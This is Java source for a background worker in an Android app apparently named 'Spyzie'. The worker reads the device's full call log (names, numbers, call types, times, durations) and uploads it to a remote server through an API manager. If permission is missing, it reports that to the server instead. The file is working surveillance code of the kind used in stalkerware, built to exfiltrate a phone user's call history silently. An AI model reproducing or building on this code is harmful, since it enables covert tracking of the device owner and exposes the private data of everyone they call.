package com.tantd.spyzie.data.device.worker;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.data.model.Call;
import com.tantd.spyzie.data.model.CommonResponse;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.network.ApiManager;
import com.tantd.spyzie.util.CommonUtils;
import com.tantd.spyzie.util.Constants;
import com.tantd.spyzie.util.rx.SchedulerProvider;

import java.util.ArrayList;
import java.util.List;

import javax.inject.Inject;

public class GetCallsWorker extends Worker {

    public static final String GET_CALLS_WORK_REQUEST = "GET_CALLS_WORK_REQUEST";

    @Inject
    ApiManager mApiManager;
    @Inject
    SchedulerProvider mSchedulerProvider;

    private static final String DEBUG_SUB_TAG = "[" + GetCallsWorker.class.getSimpleName() + "] ";

    public GetCallsWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        SpyzieApplication.getInstance().getServiceComponent().inject(this);

        if (CommonUtils.hasCallPermission(getApplicationContext())) {
            mApiManager.sendCallsData(getCallLog()).subscribeOn(mSchedulerProvider.io())
                    .observeOn(mSchedulerProvider.ui())
                    .subscribe(commonResponse -> handleSendingSuccess(commonResponse),
                            error -> handleSendingError(error));
            return Result.success();
        } else {
            mApiManager.sendExceptionTracking(Error.HAS_NO_CALL_LOG_PERMISSION);
            return Result.failure();
        }
    }

    private void handleSendingSuccess(CommonResponse response) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingSuccess, response=" + response);
        }
    }

    private void handleSendingError(Throwable error) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingError: " + error);
        }
    }

    private List<Call> getCallLog() {
        List<Call> calls = new ArrayList<>();
        String[] projection = new String[] {
                CallLog.Calls._ID,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };
        Cursor cursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, null);
        String name, number;
        int type;
        long id, time, duration;
        while (cursor.moveToNext()) {
            id = cursor.getLong(0);
            name = cursor.getString(1);
            number = cursor.getString(2);
            type = cursor.getInt(3);
            time = cursor.getLong(4);
            duration = cursor.getLong(5);
            calls.add(new Call(id, name, number, type, time, duration));
        }
        cursor.close();
        return calls;
    }
}
